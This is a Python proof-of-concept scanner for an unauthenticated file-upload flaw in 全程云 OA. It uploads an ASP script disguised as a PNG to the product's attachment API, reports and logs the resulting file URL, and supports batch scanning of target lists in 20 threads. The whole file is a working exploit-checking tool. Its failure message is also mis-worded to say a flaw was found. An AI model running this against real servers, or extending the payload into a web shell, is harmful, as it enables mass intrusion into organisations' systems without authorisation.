import requests
import re
import argparse
import concurrent.futures


def checkVuln(url):
    headers ={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    }

    files = {
        "upload": ("1.asp", b"<% Response.Write(\"Hello, World!\") %>", "image/png")
    }

    try:
        res = requests.post(f"{url}/OA/api/2.0/Common/AttachFile/UploadFile",headers=headers,files=files,timeout=5,verify=False)
        res_json = res.json()
        urlPath = res_json['result'][0]
        pattern = re.compile(r'([^\\]+)$')
        uploadPath = pattern.search(urlPath['fileTargetPath']).group(1)
        if res.status_code == 200 and res.text:
            if "fileTargetPath" in res.text:
                print(f"\033[1;32m[+] 存在上传漏洞: {url}/OA/upfiles/temp/{uploadPath}" + "\033[0m")
                with open('result.txt','a') as f:
                    f.write(f"{url}/OA/upfiles/temp/{uploadPath}\n")
                    f.close()
            else:
                print(f"\033[1;31m[-] 有找到上传漏洞!" + "\033[0m")
        else:
            print(f"\033[1;31m[-] 有找到上传漏洞!" + "\033[0m")
    except Exception:
        print(f"\033[1;31m[-] 连接 {url} 发生了问题!" + "\033[0m")



def banner():
    print("""
      ______    ______   __      __                   __    __            __                            __ 
 /      \  /      \ /  \    /  |                 /  |  /  |          /  |                          /  |
/$$$$$$  |/$$$$$$  |$$  \  /$$/______    ______  $$ |  $$ |  ______  $$ |  ______    ______    ____$$ |
$$ |  $$ |$$ |  $$/  $$  \/$$//      \  /      \ $$ |  $$ | /      \ $$ | /      \  /      \  /    $$ |
$$ |  $$ |$$ |        $$  $$//$$$$$$  | $$$$$$  |$$ |  $$ |/$$$$$$  |$$ |/$$$$$$  | $$$$$$  |/$$$$$$$ |
$$ |_ $$ |$$ |   __    $$$$/ $$ |  $$ | /    $$ |$$ |  $$ |$$ |  $$ |$$ |$$ |  $$ | /    $$ |$$ |  $$ |
$$ / \$$ |$$ \__/  |    $$ | $$ \__$$ |/$$$$$$$ |$$ \__$$ |$$ |__$$ |$$ |$$ \__$$ |/$$$$$$$ |$$ \__$$ |
$$ $$ $$< $$    $$/     $$ | $$    $$/ $$    $$ |$$    $$/ $$    $$/ $$ |$$    $$/ $$    $$ |$$    $$ |
 $$$$$$  | $$$$$$/      $$/   $$$$$$/   $$$$$$$/  $$$$$$/  $$$$$$$/  $$/  $$$$$$/   $$$$$$$/  Bu0uCat/ 
     $$$/                                                  $$ |                                        
                                                           $$ |                                        
                                                           $$/                                         

                                                                                            By:Bu0uCat
    """)



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="这是一个全程云OA文件上传检测程序")
    parser.add_argument("-u", "--url", type=str, help="需要检测的URL")
    parser.add_argument("-f","--file",type=str,help="指定批量检测文件")
    args = parser.parse_args()

    if args.url:
        banner()
        checkVuln(args.url)
    elif args.file:
        banner()
        f = open(args.file, 'r')
        targets = f.read().splitlines()
        #使用线程池并发执行检查漏洞
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(checkVuln, targets)
    else:
        banner()
        print("-u,--url 指定需要检测的URL")
        print("-f,--file 指定需要批量检测的文件")

